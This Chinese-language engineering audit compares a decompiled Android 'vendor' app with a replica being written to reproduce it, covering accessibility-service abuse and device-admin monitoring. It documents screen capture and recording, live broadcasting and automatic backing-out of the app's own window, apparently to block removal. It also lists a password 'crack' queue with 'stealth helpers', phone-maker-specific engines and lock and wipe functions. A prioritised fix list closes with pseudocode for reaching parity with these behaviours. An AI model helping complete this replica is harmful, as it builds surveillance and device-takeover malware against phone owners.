# MODULE_02 权限绕过 — Vendor 行为审计

## 1. 模块职责

无障碍服务 + 设备管理员 + 引擎管理。通过无障碍服务获取屏幕内容和执行操作，通过设备管理员监控密码事件，通过引擎管理器分发事件到厂商适配引擎。

## 2. 架构对比

### Vendor 架构 (继承链)
```
AccessibilityService (Android SDK)
  └── AccessibilityDelegateManager (800行) — 引擎队列 + 事件分发
        └── MyAccessibilityService (1402行) — 生命周期 + 根节点管理 + 静态访问
```

### Replica 架构 (组合)
```
AccessibilityService (Android SDK)
  └── MyAccessibilityService (371行) — 生命周期 + 事件处理
        └── EngineManager (576行) — 引擎队列 + 事件分发 (组合持有)
```

ADAPT: 继承→组合是有意的架构调整，但导致了大量行为差异。

## 3. MyAccessibilityService 差距分析

### 3.1 静态字段

| Vendor 字段 | 类型 | Replica 对应 | 状态 |
|------------|------|-------------|------|
| f219p | AtomicReference<MyAccessibilityService> | instanceRef | ✅ |
| q | AtomicBoolean (paused) | paused | ✅ |
| f220r | AtomicBoolean | 缺失 | ❌ |
| f221s | AtomicReference<UiObject> (root) | cachedRootNode | ✅ |
| f222t | AtomicReference<AccessibilityNodeInfo> | 缺失 | ❌ |
| f223u | AtomicReference<String> (packageName) | lastPackageName (非AtomicRef) | ⚠️ |
| f224v | AtomicReference<String> (className) | currentWindowClass | ✅ |
| f225w | AtomicReference<String> (windowTitle) | 缺失 | ❌ |

### 3.2 实例字段

| Vendor 字段 | 类型 | Replica 对应 | 状态 |
|------------|------|-------------|------|
| f226k | AtomicInteger (listenWindowCount) | 缺失 | ❌ |
| f227l | ReentrantLock | eventLock | ✅ |
| f228m | VideoRecordManager (d0.a) | 缺失 | ❌ |
| f229n | AtomicBoolean | 缺失 | ❌ |
| f230o | ThreadPoolExecutor | 缺失 | ❌ |

### 3.3 生命周期方法

| Vendor 方法 | 行为 | Replica | 状态 |
|------------|------|---------|------|
| onCreate() | 清空 f221s/f222t/f223u/f224v | 设置 instanceRef + 创建 EngineManager | ⚠️ 不同 |
| onServiceConnected() | r0() + j0() | 配置 ServiceInfo | ⚠️ 严重不同 |
| onDestroy() | 清理全部 + 发送 ACCESSIBILITY_SERVICE_OFF | 清理 + 日志 | ⚠️ 缺失事件上报 |
| onRebind() | 清空 refs + j0() | 缺失 | ❌ |
| onLowMemory() | H(true, true) 清缓存 | 缺失 | ❌ |
| onTrimMemory() | H(true, true) 清缓存 | 缺失 | ❌ |
| onTaskRemoved() | 日志 | 缺失 | ❌ |
| onStart() | 日志 | 缺失 | ❌ |
| onUnbind() | 日志 | 缺失 | ❌ |

### 3.4 关键方法 r0() — ServiceInfo 配置

Vendor:
```java
r0() {
    info = getServiceInfo();
    // 检查 crashed 字段 (反射)
    info.feedbackType = -1;           // ALL
    info.eventTypes = 8419391;        // 0x80783F = 特定事件组合
    info.flags = 91;                  // 0x5B = 多个 flag 组合
    info.notificationTimeout = 0;     // 无延迟
    setServiceInfo(info);
    if (SDK >= 33) setCacheEnabled(true);
}
```

Replica:
```java
onServiceConnected() {
    info.eventTypes = TYPES_ALL_MASK;  // ❌ 不同
    info.feedbackType = FEEDBACK_GENERIC; // ❌ 不同
    info.notificationTimeout = 100;    // ❌ 不同
    info.flags = FLAG_REPORT_VIEW_IDS | FLAG_RETRIEVE_INTERACTIVE_WINDOWS | FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
    // ❌ 缺少 crashed 字段检查
    // ❌ 缺少 setCacheEnabled(true)
}
```

### 3.5 关键方法 j0() — 服务初始化

Vendor:
```java
j0() {
    f220r.set(false);
    f230o = new ThreadPoolExecutor(0, 20, 50ms, SynchronousQueue);
    f219p.set(this);
    // 首次开启: 返回桌面 + 等待 1s + 标记
    if (!g.p0() && h.q()) {
        g.F0(1);  // performGlobalAction(BACK)
        g.T0(5);  // sleep 1s
        h.D(false, "isFirstOpenAccessibility");
    }
    p0();  // 上报 ACCESSIBILITY_CONTAINER 开启事件
    if (d0() <= 2) l.d();  // 加载监听窗口
    MainApplication.getInstance().offerAccessibilityEvent(32);
}
```

Replica: 完全缺失此方法。

### 3.6 onAccessibilityEvent 事件处理

Vendor:
```java
onAccessibilityEvent(event) {
    if (!lock.tryLock()) { Log.e("事件被忽略"); return; }
    try {
        f214h.set(true);
        if (f219p.get() == null) f219p.set(this);
        if (U(event)) return;     // 自身窗口检测 → 自动返回
        if (w.a.a()) return;      // 全局暂停检查
        G(event);                  // 更新根节点 (663条指令, 反编译失败)
        f0(event);                 // 引擎分发
        b0(event);                 // 直播广播
        c0(event);                 // 录屏事件
        // 异步提交到线程池
        if (!X(event) && f230o != null) {
            f230o.submit(new b0(this, obtain, 1));
        }
    } finally { lock.unlock(); }
}
```

Replica:
```java
onAccessibilityEvent(event) {
    if (paused.get()) return;
    if (!eventLock.tryLock()) return;
    try {
        updateRootNode(event);     // 简化版 G()
        dispatchToEngines(event);  // 简化版 f0()
        broadcastEvent(event);     // 空实现
        handleSpecificEvent(event); // 空实现
    } finally { eventLock.unlock(); }
}
```

差距:
- ❌ 缺少 U(event) 自身窗口检测 + 自动返回
- ❌ 缺少全局暂停检查 w.a.a()
- ❌ 缺少异步线程池提交
- ❌ G(event) 反编译失败，replica 用简化版
- ❌ b0(event) 直播广播未实现
- ❌ c0(event) 录屏事件未实现

## 4. AccessibilityDelegateManager vs EngineManager 差距

### 4.1 引擎注册方式

Vendor b() 方法 (行 282-362):
```
if (e.i()) → new v()     // OPPO (isOppo)
if (e.m()) → new o.q()   // 小米 (isMiui)
if (e.g()) → new n()     // 华为 (isHuawei)
if (e.l()) → new i0()    // 屏幕解锁
if (e.k()) → new e0()    // 传音
default    → new o.g()   // 通用
```

Replica registerVendorEngines():
```
always → DeviceAdminEngine + AccessibilityServiceEngine + LockScreenMonitor + PermissionAutoGrantEngine
if isXiaomi → XiaomiEngine
if isHuawei → HuaweiEngine
...
```

差距:
- ⚠️ Vendor 不注册通用引擎 (DeviceAdmin/Permission 等)，这些功能在其他地方处理
- ⚠️ Vendor 的引擎选择是互斥的 (if-else)，replica 是叠加的
- ❌ Vendor 引擎注册时会启动异步任务 `thread.l.c(new d(engine, str, N), engine.c)`

### 4.2 事件分发

Vendor f0() (行 836-855):
```java
f0(event) {
    if (f229n.get() || W(event)) return;  // 忽略检查
    for (engine : f209a) {
        if (engine.o() && engine.l() != null && engine.l().contains(eventType)) {
            engine.u(event, packageName, className);
        }
    }
    g0(event);  // 全局引擎 g0Var 分发
}
```

Replica dispatchToEngines():
```java
for (engine : engines) {
    if (engine.matchWindow(pkg, cls, eventType)) {
        engine.onAccessibilityEvent(event, pkg, cls);
    }
}
```

差距:
- ❌ 缺少 W(event) 忽略检查 (自身包名/com.google.guard)
- ❌ 缺少 g0Var 全局引擎分发
- ⚠️ 匹配逻辑不同: vendor 用 o()/l().contains(), replica 用 matchWindow()

## 5. CustomAdminReceiver 差距

| Vendor 方法 | 行为 | Replica | 状态 |
|------------|------|---------|------|
| a() reportStatus | 构建 DeviceAdminVO → 消息队列 | TODO stub | ❌ |
| onPasswordChanged | h.G() + 清除 deviceCipher | 只有日志 | ❌ |
| onPasswordFailed | 存 lockBatchId + 清 crack 队列 | 只有日志 | ❌ |
| onPasswordSucceeded | crack 成功 + stealth helpers | 只有日志 | ❌ |
| (extra methods) | 无 | lockScreen/wipeData/resetPassword | ⚠️ vendor 没有 |

## 6. 优先修复项

### P0 (影响基本功能)
1. r0() ServiceInfo 配置对齐 — eventTypes/feedbackType/flags/timeout
2. j0() 服务初始化 — 线程池 + 首次开启返回桌面 + 上报事件
3. onRebind() — 服务重启时重新初始化
4. 缺失的静态字段 f222t/f223u/f225w

### P1 (影响引擎运行)
5. U(event) 自身窗口检测 + 自动返回
6. W(event)/X(event) 事件忽略逻辑
7. 异步线程池事件处理
8. onLowMemory/onTrimMemory 缓存清理

### P2 (影响数据上报)
9. p0()/q0() 容器事件上报
10. onDestroy 发送 ACCESSIBILITY_SERVICE_OFF
11. CustomAdminReceiver 密码事件处理
